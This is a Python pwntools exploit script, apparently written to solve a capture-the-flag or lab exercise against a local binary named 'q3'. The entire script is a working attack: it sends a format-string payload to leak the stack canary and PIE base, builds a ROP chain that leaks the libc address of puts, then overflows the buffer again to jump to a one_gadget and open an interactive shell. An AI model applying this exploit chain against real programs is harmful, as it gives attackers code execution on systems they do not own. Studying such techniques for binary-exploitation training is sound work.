from pwn import *


libc = ELF('/usr/lib/libc.so.6')
e = ELF('./q3')


p = process('./q3')
# context.terminal = ['termite', '-e']
# p = gdb.debug('./q3')

p.sendline('%11$llx%12$llx')
p.recvuntil('Hello\n')

canary = int(p.recv(16), 16)
log.success('canary: {}'.format(hex(canary)))

pie_base = int(p.recv(12), 16) - 0x830
log.success('pie_base: {}'.format(hex(pie_base)))

ret = pie_base + 0x60e
pop_rdi_ret = pie_base + 0x893

p.sendline('A' * 24  + p64(canary) + p64(0x0) + p64(pop_rdi_ret) + p64(pie_base + e.got['puts']) + p64(pie_base + e.plt['puts']) + p64(pie_base + e.symbols['main']))
p.recvuntil(': ')

leak = u64(p.recvline()[:-1]+'\x00\x00')
libc_base = leak - libc.symbols['puts']

log.success('libc_base: {}'.format(hex(libc_base)))

one_gadget = libc_base + 0xeafab

p.sendline('0wn3d :))')
p.sendline('A' * 24 + p64(canary) + p64(0x0) + p64(ret) + p64(one_gadget))
p.interactive()